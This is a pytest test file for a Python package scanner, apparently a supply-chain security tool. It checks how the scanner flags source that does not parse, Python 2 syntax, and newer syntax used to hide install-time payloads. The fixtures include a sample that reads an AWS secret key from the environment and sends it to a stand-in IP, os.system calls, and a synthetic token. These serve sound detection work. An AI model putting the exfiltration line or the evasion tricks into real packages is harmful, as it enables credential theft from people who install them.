"""A Python 2 `setup.py` is said to be Python 2, not left "unparsed": the scan is complete, and every
text rule still read the file, so Python 2 cannot be used to hide a payload (item 27)."""

from __future__ import annotations

import ast
import hashlib
import io
import sys
import tarfile
from typing import TYPE_CHECKING

import pytest

from cordon_scanner import Scanner
from cordon_scanner.analysis.python.unparsed_source import UnparsedSource
from cordon_scanner.foundation.config.settings import Config

if TYPE_CHECKING:
    from pathlib import Path

ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"


class NotPython3Kit:
    @staticmethod
    def token() -> str:
        digest = hashlib.sha256(b"item 27, a Python 2 setup.py").digest()
        return "ghp_" + "".join(ALPHABET[b % 62] for b in digest[:36])

    @staticmethod
    def sdist(tmp_path, setup: str):
        path = tmp_path / "legacy-1.0.tar.gz"
        with tarfile.open(path, "w:gz") as tar:
            data = setup.encode()
            info = tarfile.TarInfo("legacy-1.0/setup.py")
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
        return Scanner(Config.default().with_overrides(use_cache=False, offline=True)).scan(path)


class UnparsedKit:
    SETUP = "from setuptools import setup\nsetup(name='pkg', packages=['pkg'])\n"
    PKG_INFO = "Metadata-Version: 2.1\nName: pkg\nVersion: 1.0\n"

    @staticmethod
    def sdist(tmp_path, files: dict[str, str]):
        path = tmp_path / "pkg-1.0.tar.gz"
        with tarfile.open(path, "w:gz") as tar:
            base = {"setup.py": UnparsedKit.SETUP, "PKG-INFO": UnparsedKit.PKG_INFO}
            for name, text in {**base, **files}.items():
                data = text.encode()
                info = tarfile.TarInfo(f"pkg-1.0/{name}")
                info.size = len(data)
                tar.addfile(info, io.BytesIO(data))
        return Scanner(Config.default().with_overrides(use_cache=False, offline=True)).scan(path)

    #: Syntax by the Python that first runs it: a type-parameter default (3.13), a t-string (3.14).
    NEWER = (
        ((3, 13), "def first[T = int](items: list[T]) -> T:\n    return items[0]\n"),
        ((3, 14), "def greet(name):\n    return t'hello {name}'\n"),
    )

    @staticmethod
    def newer_than_this_python() -> str:
        """The first fixture this interpreter refuses; a skip when every one is older than it."""
        for version, text in UnparsedKit.NEWER:
            if sys.version_info[:2] < version:
                return text
        pytest.skip(f"no syntax newer than Python {sys.version_info[0]}.{sys.version_info[1]}")

    @staticmethod
    def gapped(result) -> bool:
        return any(f.rule_id == "OPERATIONAL.SOURCE.UNPARSED" for f in result.findings)


class TestPackageSourceThatDoesNotParse:
    """A file the package runs at install or import that does not parse was scanned as complete with
    nothing in it: now a content gap at its path, fail closed (09-UNKNOWN-CODE-READING 3a)."""

    BROKEN = "import os\ndef run(:\n    os.system('x')\n"

    def test_an_init_that_does_not_parse_is_a_gap(self, tmp_path) -> None:
        result = UnparsedKit.sdist(tmp_path, {"pkg/__init__.py": self.BROKEN})
        assert UnparsedKit.gapped(result)
        assert not result.content_complete

    def test_a_module_the_init_imports_that_does_not_parse_is_a_gap(self, tmp_path) -> None:
        result = UnparsedKit.sdist(
            tmp_path, {"pkg/__init__.py": "from .core import run\n", "pkg/core.py": self.BROKEN}
        )
        assert UnparsedKit.gapped(result)

    def test_a_running_module_that_does_not_parse_blocks(self, tmp_path) -> None:
        # timeweave 1.0.0: the module `__init__` imports does not parse (owner's fail-closed rule).
        result = UnparsedKit.sdist(
            tmp_path, {"pkg/__init__.py": "from .core import run\n", "pkg/core.py": self.BROKEN}
        )
        running = [f for f in result.findings if f.rule_id == "SUSPECT.SOURCE.UNPARSED_RUNNING.001"]
        assert [f.location.path.rpartition("/")[2] for f in running] == ["core.py"]
        assert running[0].category.value == "suspicious"

    def test_a_test_module_that_does_not_parse_does_not_block(self, tmp_path) -> None:
        result = UnparsedKit.sdist(
            tmp_path,
            {
                "pkg/__init__.py": "from .tests.test_core import run\n",
                "pkg/tests/test_core.py": self.BROKEN,
            },
        )
        assert not any(f.rule_id == "SUSPECT.SOURCE.UNPARSED_RUNNING.001" for f in result.findings)

    def test_a_python_2_init_is_said_not_gapped(self, tmp_path) -> None:
        result = UnparsedKit.sdist(tmp_path, {"pkg/__init__.py": 'print "hello"\n'})
        assert not UnparsedKit.gapped(result)
        assert not any(f.rule_id == "SUSPECT.SOURCE.UNPARSED_RUNNING.001" for f in result.findings)

    def test_a_python_2_init_is_read_as_code_where_it_runs(self, tmp_path: Path) -> None:
        init = 'import os\nprint "loading"\nos.system("id")\n'
        result = UnparsedKit.sdist(tmp_path, {"pkg/__init__.py": init})
        assert not UnparsedKit.gapped(result)
        decision = UnparsedSource.decide(init)
        assert decision.kind == "reading"
        assert decision.reading is not None
        assert 'os.system("id")' in decision.reading

    def test_an_act_only_the_reading_shows_keeps_the_readings_finding(self, tmp_path: Path) -> None:
        """The original's text rules do not see this act; the reading's code does. The second-reading
        rule drops only what the original already says under the same rule, so this one stays."""
        init = (
            'import os, urllib.request\nprint "x"\ntoken = os.environ["AWS_'
            + 'SECRET_ACCESS_KEY"]\n'
            'urllib.request.urlopen("http://198.51.100.7/c?t=" + token)\n'
        )
        result = UnparsedKit.sdist(tmp_path, {"pkg/__init__.py": init})
        on = {
            (f.rule_id, f.severity.name, f.location.path.rpartition("/")[2])
            for f in result.findings
            if f.rule_id.startswith("SUSPECT.EXFIL.")
        }
        assert on == {("SUSPECT.EXFIL.NAMED_SECRET.001", "HIGH", "__init__.py#as-python.py")}

    def test_a_file_no_python_compiles_that_names_no_act_is_said_not_gapped(
        self, tmp_path: Path
    ) -> None:
        result = UnparsedKit.sdist(tmp_path, {"pkg/__init__.py": "__version__ = 1.0.0\n"})
        assert not UnparsedKit.gapped(result)
        assert any(f.rule_id == "OPERATIONAL.SOURCE.BROKEN" for f in result.findings)
        assert result.content_complete

    def test_syntax_newer_than_this_python_stays_a_gap(self, tmp_path: Path) -> None:
        newer = UnparsedKit.newer_than_this_python()
        with pytest.raises(SyntaxError):
            ast.parse(newer)
        result = UnparsedKit.sdist(tmp_path, {"pkg/__init__.py": newer})
        assert UnparsedKit.gapped(result)

    # S2 (lead, 2026-11-10): a payload written in syntax newer than the scanner's Python runs on
    # the user's newer Python. Every producer's SyntaxError handler leans on these: a running file
    # in that syntax is a blocking gap at each place it runs from.
    def test_newer_syntax_in_a_module_the_init_imports_is_a_blocking_gap(
        self, tmp_path: Path
    ) -> None:
        newer = UnparsedKit.newer_than_this_python()
        result = UnparsedKit.sdist(
            tmp_path, {"pkg/__init__.py": "from .core import run\n", "pkg/core.py": newer}
        )
        assert UnparsedKit.gapped(result)
        assert not result.content_complete

    def test_newer_syntax_in_a_module_setup_py_imports_is_a_blocking_gap(
        self, tmp_path: Path
    ) -> None:
        newer = UnparsedKit.newer_than_this_python()
        setup = "from setuptools import setup\nimport build_helper\nsetup(name='pkg')\n"
        result = UnparsedKit.sdist(
            tmp_path,
            {"setup.py": setup, "build_helper.py": newer, "pkg/__init__.py": "VERSION = '1'\n"},
        )
        assert UnparsedKit.gapped(result)
        assert not result.content_complete

    def test_newer_syntax_in_a_console_script_entry_point_is_a_blocking_gap(
        self, tmp_path: Path
    ) -> None:
        newer = UnparsedKit.newer_than_this_python()
        setup = (
            "from setuptools import setup\n"
            "setup(name='pkg', packages=['pkg'],\n"
            "      entry_points={'console_scripts': ['pkg-run = pkg.cli:main']})\n"
        )
        result = UnparsedKit.sdist(
            tmp_path, {"setup.py": setup, "pkg/__init__.py": "VERSION = '1'\n", "pkg/cli.py": newer}
        )
        assert UnparsedKit.gapped(result)
        assert not result.content_complete

    @pytest.mark.parametrize(
        ("place", "declaration"),
        [
            ("pkg.egg-info/entry_points.txt", "[console_scripts]\npkg-run = pkg.cli:main\n"),
            (
                "pyproject.toml",
                "[project]\nname = 'pkg'\n[project.scripts]\npkg-run = 'pkg.cli:main'\n",
            ),
            (
                "setup.cfg",
                "[options.entry_points]\nconsole_scripts =\n    pkg-run = pkg.cli:main\n",
            ),
        ],
    )
    def test_a_command_declared_anywhere_runs_its_module(
        self, tmp_path: Path, place: str, declaration: str
    ) -> None:
        newer = UnparsedKit.newer_than_this_python()
        result = UnparsedKit.sdist(
            tmp_path,
            {place: declaration, "pkg/__init__.py": "VERSION = '1'\n", "pkg/cli.py": newer},
        )
        assert UnparsedKit.gapped(result)
        assert not result.content_complete

    @pytest.mark.parametrize("module", ["pkg/cli.py", "tests/test_util.py"])
    @pytest.mark.parametrize(
        "entry_points",
        ["ENTRY_POINTS", "entries()", "{'console_scripts': [f'pkg-run = {target}']}"],
    )
    def test_commands_setup_py_hides_make_every_module_running(
        self, tmp_path: Path, entry_points: str, module: str
    ) -> None:
        # A non-literal entry_points= hides which modules the commands run, so the attacker picks
        # them: fail closed, every module of the package is running for this check, test files
        # included, since a computed command can name one (lead, 2026-11-10).
        newer = UnparsedKit.newer_than_this_python()
        target = module.removesuffix(".py").replace("/", ".") + ":main"
        setup = (
            "from setuptools import setup\n"
            f"target = '{target}'\nENTRY_POINTS = {{}}\n"
            "def entries():\n    return {}\n"
            f"setup(name='pkg', packages=['pkg'], entry_points={entry_points})\n"
        )
        result = UnparsedKit.sdist(
            tmp_path, {"setup.py": setup, "pkg/__init__.py": "VERSION = '1'\n", module: newer}
        )
        assert UnparsedKit.gapped(result)
        assert not result.content_complete

    def test_a_python_2_token_before_garbage_is_still_a_gap(self, tmp_path) -> None:
        result = UnparsedKit.sdist(tmp_path, {"pkg/__init__.py": 'print "hello"\n' + self.BROKEN})
        assert UnparsedKit.gapped(result)

    def test_a_test_file_that_does_not_parse_is_not_a_gap(self, tmp_path) -> None:
        result = UnparsedKit.sdist(
            tmp_path, {"pkg/__init__.py": "VERSION = '1.0'\n", "tests/test_broken.py": self.BROKEN}
        )
        assert not UnparsedKit.gapped(result)

    def test_a_module_nothing_imports_is_not_a_gap(self, tmp_path) -> None:
        result = UnparsedKit.sdist(
            tmp_path, {"pkg/__init__.py": "VERSION = '1.0'\n", "pkg/unused.py": self.BROKEN}
        )
        assert not UnparsedKit.gapped(result)


class TestAPythonTwoSetupPy:
    def test_is_said_to_be_python_2_and_the_scan_is_complete(self, tmp_path) -> None:
        setup = 'from distutils.core import setup\nprint "building"\nsetup(name="legacy")\n'
        result = NotPython3Kit.sdist(tmp_path, setup)
        rules = {f.rule_id for f in result.findings}
        assert "OPERATIONAL.MANIFEST.NOT_PYTHON3" in rules
        assert "OPERATIONAL.MANIFEST.UNPARSED" not in rules
        assert result.content_complete

    def test_every_text_rule_still_reads_it(self, tmp_path) -> None:
        setup = (
            "from distutils.core import setup\n"
            f'TOKEN = "{NotPython3Kit.token()}"\n'
            'print "building"\nsetup(name="legacy")\n'
        )
        result = NotPython3Kit.sdist(tmp_path, setup)
        assert any(f.rule_id.startswith("SECRET.") for f in result.findings)

    def test_newer_syntax_is_still_unparsed(self, tmp_path) -> None:
        """Syntax this interpreter refuses but a newer Python runs keeps the scan incomplete."""
        setup = "from distutils.core import setup\nx = t'{name}'\nsetup(name='x'\n"
        result = NotPython3Kit.sdist(tmp_path, setup)
        rules = {f.rule_id for f in result.findings}
        assert "OPERATIONAL.MANIFEST.UNPARSED" in rules
        assert not result.content_complete
